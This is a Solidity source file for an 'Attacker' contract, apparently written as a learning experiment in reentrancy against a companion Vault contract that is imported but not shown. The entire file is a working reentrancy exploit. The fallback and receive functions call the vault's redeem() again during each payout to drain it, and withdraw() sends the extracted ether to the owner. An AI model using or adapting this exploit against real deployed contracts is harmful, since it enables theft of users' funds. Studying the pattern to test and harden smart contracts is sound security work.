// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";

import "./Vault.sol";
 

/**
 * @title A contract to experiment the reentrancy attack
 * @author Adrien L. <hladrien@gmail.com>
 * @notice It should be executed in 3 steps:
 *  1) storing a little bit of ether with store()
 *  2) starting the attack with a redeem() call
 *  3) a withdraw of the extracted fund 
 */
contract Attacker is Ownable {
    error WithdrawFailure();

    event ValueStored(uint amount);
    event RedeemCall(uint callCount);
    event FallbackCall(uint callCount, uint value);
  
    Vault vault;
    uint redeemCallCount;
    uint fallbackCallCount;
 
    /**
     * @notice Init deployed Vault contract based on the contract address
     */
    constructor(address _contractAddr) {
        vault = Vault(_contractAddr);
    }

    fallback() external payable {
        this.redeem();
        emit FallbackCall(++fallbackCallCount, msg.value);
    }
  
    receive() external payable {
        this.redeem();
        emit FallbackCall(++fallbackCallCount, msg.value);
    }
  
    /**
     * @notice Store ether to Vault contract from this contract
     */
    function store() external payable onlyOwner {
        vault.store{value: msg.value}();
        emit ValueStored(msg.value);
    }
       
    /**
     * @notice start the real attack with a first redeem call
     */
    function redeem() external {
        emit RedeemCall(++redeemCallCount);
        vault.redeem();
    }
    
    function getSenderBalance() external view onlyOwner returns (uint) {
        return address(msg.sender).balance;
    }
    
    function getAttackerBalance() external view onlyOwner returns (uint) {
        return address(this).balance;
    }

    function getVaultBalance() external view onlyOwner returns (uint) {
        return address(vault).balance;
    }

    /**
     * @notice withdraw the extracted funds from this contract
     */
    function withdraw() external onlyOwner {
        (bool success,) = msg.sender.call{ value: address(this).balance }("");
        if (!success) {
            revert WithdrawFailure();
        }
    }
}
